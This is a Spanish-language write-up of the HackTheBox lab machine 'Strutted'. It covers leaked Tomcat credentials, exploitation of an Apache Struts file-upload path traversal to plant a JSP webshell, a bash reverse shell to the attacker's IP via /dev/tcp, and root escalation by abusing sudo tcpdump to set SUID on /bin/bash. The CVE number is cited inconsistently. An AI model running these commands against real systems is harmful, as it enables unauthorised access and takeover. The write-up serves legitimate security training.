---
title: <span style="color:#27F5DA">Strutted</span>
layout: single
excerpt: ""
header:
show_date: true
classes: wide
header:
  teaser: "/assets/images/htb-writeup-strutted/strutted.png"
  teaser_home_page: true
  icon: "https://user-images.githubusercontent.com/69093629/125662338-fd8b3b19-3a48-4fb0-b07c-86c047265082.png"
categories:
  - HackTheBox
tags:
  - Information Leakage
  - Apache Struts Exploitation [CVE-2024-53677]
  - Apache Struts, Interceptors and OGNL Expression Language Explained
  - Abusing File Upload (Malicious JSP File)
  - Abusing Sudoers Privilege (tcpdump) [Privilege Escalation]



date: 2025-09-10 
---

<span style="color:#ecab57">Strutted</span>



![](/assets/images/htb-writeup-strutted/strutted.png)






![](/assets/images/htb-writeup-strutted/1.png) 

Si nos vamos al apartado de download se nos descarga un ZIP. Vamos a echarle un ojo.

```bash
❯ mv ~/Downloads/strutted.zip ./../content
❯ cd ../content
❯ 7z l strutted.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:5 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 39680602 bytes (38 MiB)

Listing archive: strutted.zip

--
Path = strutted.zip
Type = zip
Physical Size = 39680602

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2025-01-07 01:59:33 .....          615          293  Dockerfile
2025-01-07 01:59:33 .....         4064         1731  README.md
2025-01-07 01:59:33 .....         1361          786  context.xml
2025-01-07 01:59:33 D....            0            0  strutted
2025-01-07 01:59:33 .....         3999         1013  strutted/pom.xml
2025-01-07 01:59:33 .....         5810         2222  strutted/mvnw.cmd
2025-01-07 01:59:33 .....         9113         3030  strutted/mvnw
2025-01-07 01:59:33 D....            0            0  strutted/src
2025-01-07 01:59:33 D....            0            0  strutted/src/main
2025-01-07 01:59:33 D....            0            0  strutted/src/main/webapp
2025-01-07 02:00:20 D....            0            0  strutted/src/main/webapp/WEB-INF
2025-01-07 02:01:18 .....         4303         1436  strutted/src/main/webapp/WEB-INF/error.jsp
2025-01-07 01:59:33 .....         1117          409  strutted/src/main/webapp/WEB-INF/web.xml
2025-01-07 02:01:35 .....         4285         1402  strutted/src/main/webapp/WEB-INF/showImage.jsp
2025-01-07 02:11:38 .....         5647         1778  strutted/src/main/webapp/WEB-INF/upload.jsp
2025-01-07 02:01:26 .....         6125         1853  strutted/src/main/webapp/WEB-INF/how.jsp
2025-01-07 02:01:10 .....         6616         2208  strutted/src/main/webapp/WEB-INF/about.jsp
2025-01-07 02:01:45 .....         7120         2059  strutted/src/main/webapp/WEB-INF/success.jsp
2025-01-07 01:59:33 D....            0            0  strutted/src/main/java
2025-01-07 01:59:33 D....            0            0  strutted/src/main/java/org
2025-01-07 01:59:33 D....            0            0  strutted/src/main/java/org/strutted
2025-01-07 02:00:44 D....            0            0  strutted/src/main/java/org/strutted/htb
2025-01-07 01:59:33 .....         6656         1823  strutted/src/main/java/org/strutted/htb/Upload.java
2025-01-07 01:59:33 .....         1832          503  strutted/src/main/java/org/strutted/htb/URLMapping.java
2025-01-07 01:59:33 .....          199          147  strutted/src/main/java/org/strutted/htb/AboutAction.java
2025-01-07 01:59:33 .....         1582          630  strutted/src/main/java/org/strutted/htb/DatabaseUtil.java
2025-01-07 01:59:33 .....          197          147  strutted/src/main/java/org/strutted/htb/HowAction.java
2025-01-07 01:59:33 .....         1146          443  strutted/src/main/java/org/strutted/htb/URLUtil.java
2025-01-07 01:59:33 D....            0            0  strutted/src/main/resources
2025-01-07 02:00:54 .....         2145          678  strutted/src/main/resources/struts.xml
2025-01-07 01:59:33 D....            0            0  strutted/target
2025-01-07 01:59:33 D....            0            0  strutted/target/generated-sources
2025-01-07 01:59:33 D....            0            0  strutted/target/generated-sources/annotations
2025-01-07 01:59:33 D....            0            0  strutted/target/strutted-1.0.0
2025-01-07 01:59:33 D....            0            0  strutted/target/strutted-1.0.0/META-INF
2025-01-07 01:59:33 D....            0            0  strutted/target/strutted-1.0.0/WEB-INF
2025-01-07 01:59:33 .....          587          346  strutted/target/strutted-1.0.0/WEB-INF/error.jsp
2025-01-07 01:59:33 .....         1117          409  strutted/target/strutted-1.0.0/WEB-INF/web.xml
2025-01-07 01:59:33 D....            0            0  strutted/target/strutted-1.0.0/WEB-INF/lib
2025-01-07 01:59:33 .....       794034       738335  strutted/target/strutted-1.0.0/WEB-INF/lib/javassist-3.29.0-GA.jar
2025-01-07 01:59:33 .....     14259880     14221392  strutted/target/strutted-1.0.0/WEB-INF/lib/sqlite-jdbc-3.47.1.0.jar
2025-01-07 01:59:33 .....       632267       573075  strutted/target/strutted-1.0.0/WEB-INF/lib/commons-lang3-3.13.0.jar
2025-01-07 01:59:33 .....       264823       253389  strutted/target/strutted-1.0.0/WEB-INF/lib/ognl-3.3.4.jar
2025-01-07 01:59:33 .....        95505        83833  strutted/target/strutted-1.0.0/WEB-INF/lib/javax.servlet-api-4.0.1.jar
2025-01-07 01:59:33 .....        74132        64158  strutted/target/strutted-1.0.0/WEB-INF/lib/commons-fileupload-1.5.jar
2025-01-07 01:59:33 .....       238400       215227  strutted/target/strutted-1.0.0/WEB-INF/lib/commons-text-1.10.0.jar
2025-01-07 01:59:33 .....       313296       282310  strutted/target/strutted-1.0.0/WEB-INF/lib/log4j-api-2.20.0.jar
2025-01-07 01:59:33 .....      1519233      1360308  strutted/target/strutted-1.0.0/WEB-INF/lib/struts2-core-6.3.0.1.jar
2025-01-07 01:59:33 .....      1736381      1559626  strutted/target/strutted-1.0.0/WEB-INF/lib/freemarker-2.3.32.jar
2025-01-07 01:59:33 .....       483954       437052  strutted/target/strutted-1.0.0/WEB-INF/lib/commons-io-2.13.0.jar
2025-01-07 01:59:33 D....            0            0  strutted/target/strutted-1.0.0/WEB-INF/classes
2025-01-07 01:59:33 .....         2315          771  strutted/target/strutted-1.0.0/WEB-INF/classes/struts.xml
2025-01-07 01:59:33 D....            0            0  strutted/target/strutted-1.0.0/WEB-INF/classes/org
2025-01-07 01:59:33 D....            0            0  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted
2025-01-07 01:59:33 D....            0            0  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb
2025-01-07 01:59:33 .....          454          290  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/AboutAction.class
2025-01-07 01:59:33 .....         3276         1589  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/URLMapping.class
2025-01-07 01:59:33 .....         1610          847  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/URLUtil.class
2025-01-07 01:59:33 .....         7344         3859  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/Upload.class
2025-01-07 01:59:33 .....         2899         1606  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/DatabaseUtil.class
2025-01-07 01:59:33 .....          448          291  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/HowAction.class
2025-01-07 01:59:33 .....         5651         1787  strutted/target/strutted-1.0.0/WEB-INF/upload.jsp
2025-01-07 01:59:33 .....         6125         1853  strutted/target/strutted-1.0.0/WEB-INF/how.jsp
2025-01-07 01:59:33 .....         6918         2254  strutted/target/strutted-1.0.0/WEB-INF/about.jsp
2025-01-07 01:59:33 .....         7120         2059  strutted/target/strutted-1.0.0/WEB-INF/success.jsp
2025-01-07 01:59:33 D....            0            0  strutted/target/classes
2025-01-07 01:59:33 .....         2315          771  strutted/target/classes/struts.xml
2025-01-07 01:59:33 D....            0            0  strutted/target/classes/org
2025-01-07 01:59:33 D....            0            0  strutted/target/classes/org/strutted
2025-01-07 01:59:33 D....            0            0  strutted/target/classes/org/strutted/htb
2025-01-07 01:59:33 .....          454          290  strutted/target/classes/org/strutted/htb/AboutAction.class
2025-01-07 01:59:33 .....         3276         1589  strutted/target/classes/org/strutted/htb/URLMapping.class
2025-01-07 01:59:33 .....         1610          847  strutted/target/classes/org/strutted/htb/URLUtil.class
2025-01-07 01:59:33 .....         7344         3859  strutted/target/classes/org/strutted/htb/Upload.class
2025-01-07 01:59:33 .....         2899         1606  strutted/target/classes/org/strutted/htb/DatabaseUtil.class
2025-01-07 01:59:33 .....          448          291  strutted/target/classes/org/strutted/htb/HowAction.class
2025-01-07 01:59:33 D....            0            0  strutted/target/maven-archiver
2025-01-07 01:59:33 .....           57           57  strutted/target/maven-archiver/pom.properties
2025-01-07 01:59:33 .....     19820601     19820617  strutted/target/strutted-1.0.0.war
2025-01-07 01:59:33 D....            0            0  strutted/target/maven-status
2025-01-07 01:59:33 D....            0            0  strutted/target/maven-status/maven-compiler-plugin
2025-01-07 01:59:33 D....            0            0  strutted/target/maven-status/maven-compiler-plugin/compile
2025-01-07 01:59:33 D....            0            0  strutted/target/maven-status/maven-compiler-plugin/compile/default-compile
2025-01-07 01:59:33 .....          199           83  strutted/target/maven-status/maven-compiler-plugin/compile/default-compile/createdFiles.lst
2025-01-07 01:59:33 .....          589          129  strutted/target/maven-status/maven-compiler-plugin/compile/default-compile/inputFiles.lst
2025-01-07 01:59:33 .....          222          138  tomcat-users.xml
------------------- ----- ------------ ------------  ------------------------
2025-01-07 02:11:38           40371715     39661534  56 files, 30 folders

```


Al listar el archivo, podemos observar el contenido del ZIP. En él, destacan archivos como tomcat-users.xml, pom.xml y varios archivos JSP en el directorio src/main/webapp/WEB-INF.

Dentro del archivo tomcat-users.xml, donde se suele encontrar combinaciones de usuario, contraseña y roles que suelen estar definidas para acceder a funcionalidades restringidas del servidor Tomcat, como por ejemplo:

  * /manager/html – Panel web para desplegar/administrar apps

  * /host-manager/html – Administración de hosts virtuales

Encontramos una contraseña, que vamos a guardar. 

```bash
❯ cat tomcat-users.xml
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: tomcat-users.xml
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?xml version='1.0' encoding='utf-8'?>
   2   │ 
   3   │ <tomcat-users>
   4   │     <role rolename="manager-gui"/>
   5   │     <role rolename="admin-gui"/>
   6   │     <user username="admin" password="skqKY6360z!Y" roles="manager-gui,admin-gui"/>
   7   │ </tomcat-users>
 ```

El archivo pom.xml revela que el servidor está utilizando Apache Struts 6.3.0, una versión vulnerable a la explotación por CVE-2024-53677


 ![](/assets/images/htb-writeup-strutted/2.png) 

Si buscamos en internet podemos encontrar la vulnerabilidad [CVE-2024-56337](https://nvd.nist.gov/vuln/detail/cve-2024-56337), que permite enviar datos especialmente manipulados a la aplicación web, y si no está protegida correctamente, esos datos pueden hacer que el servidor ejecute comandos no deseados, dándole al atacante control total del servidor.

Apache Struts usa un interceptor que procesa los campos del formulario como objetos del modelo Java. Cuando subes un archivo, se espera que el nombre del archivo sea un nombre normal (imagen.jpg), pero si tú envías como nombre de archivo algo como ../../webapps/ROOT/rogue.jsp, puedes hacer que el archivo se escriba fuera del directorio permitido, lo que se llama path traversal.
Esto te permite subir archivos donde quieras, incluyendo el directorio web raíz, lo que lleva a RCE si subes código .jsp.

El encabezado orgiinal de la solicitud se ve como este :

 ![](/assets/images/htb-writeup-strutted/3.png) 


Para explotar la vulnerabilidad, hay que modificar el valor de name para que empiece con una letra mayúscula, es decir, cambiar name="upload" por name="Upload",además de incluir el parámetro uploadFileName para manipular cómo se maneja el archivo. 

 ![](/assets/images/htb-writeup-strutted/4.png) 

  ![](/assets/images/htb-writeup-strutted/5.png) 

  Vamos a intentar meter una webshell en jsp .

  ![](/assets/images/htb-writeup-strutted/6.png) 

  Ahora podemos intentar ganar acceso al sistema.

 Creamos un archivo index.html con un script bash que ejecuta una reverse shell hacia nuestro atacante.

  ```bash

  #!/bin/bash

  bash -i >& /dev/tcp/10.10.14.111/443 0>&1
  ```


 Luego, levantamos un servidor HTTP en nuestra máquina local para compartir el script.

  ```bash
python -m http.server 80
```
Desde la webshell hago curl  a mi ip exportando ese contenido para que se guarde en tmp/reverse.

 ![](/assets/images/htb-writeup-strutted/8.png) 

Cuando se encuentre ahi , lo interpreto con bash mientras estoy en escucha con netcat para conseguir la revershe shell.

 ![](/assets/images/htb-writeup-strutted/9.png) 


Recuerdo que tenia una contraseña del tomcat y la pruebo junto con otra que encuentro aqui:
tomcat@strutted:/etc/rc0.d$ cat /etc/tomcat9/tomcat-users.xml

```bash
<!--
  <user username="admin" password="<must-be-changed>" roles="manager-gui"/>
  <user username="robot" password="<must-be-changed>" roles="manager-script"/>
  <role rolename="manager-gui"/>
  <role rolename="admin-gui"/>
  <user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/>
--->

</tomcat-users>
```

Pero no me deja , sin embargo si intento conectarme por ssh, si me deja conectarme.


 ![](/assets/images/htb-writeup-strutted/10.png) 


<div style="text-align: center;">
    <b><span style="color: #98FB98;">USER FLAG</span></b>
    <br>
    ---------------------------
</div>
--------------------------

```bash
 james@strutted:~$ pwd
/home/james
james@strutted:~$ ls
user.txt
james@strutted:~$ cat user.txt 
3d3fa4fd9f0764f9ba7ad4b07e6745b8
james@strutted:~$ 
```


```bash
james@strutted:~$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```

el usuario james puede ejecutar tcpdump sin ser root. Si vamos a [GTFOBins](https://gtfobins.github.io/gtfobins/tcpdump/) podemos buscar herramientas que te permitan ejecutar código como root sin necesidad de una contraseña, como tcpdump o herramientas comunes en el sistema.

 ![](/assets/images/htb-writeup-strutted/11.png) 


 Como comando pone id pero yo voy a intentar asignar privilegios SUID a la bash. Como comando le pasare lo siguiente:

 ```bash
 james@strutted:~$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
james@strutted:~$ COMMAND='chmod u+s /bin/bash'
james@strutted:~$ TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel
james@strutted:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
james@strutted:~$ bash -p
bash-5.1# 
```
Este comando tiene como objetivo establecer el bit setuid en el archivo /bin/bash, lo que permite que cualquier usuario que ejecute ese binario lo haga con los privilegios de root.

Normalmente, /bin/bash tiene permisos para que los usuarios lo ejecuten, pero sin privilegios elevados. Sin embargo, al agregar el bit setuid, el comportamiento cambia y el archivo se ejecuta como root sin importar qué usuario lo lance.


<div style="text-align: center;">
    <b><span style="color: #98FB98;">ROOT FLAG</span></b>
    <br>
    ---------------------------
</div>
 --------------------------


```bash
bash-5.1# whoami
root
bash-5.1# find / -iname "*root.txt*" 2>/dev/null
/root/root.txt
bash-5.1# cat /root/root.txt
98cc755e628e00442a681acd844b9c97
bash-5.1# 
```

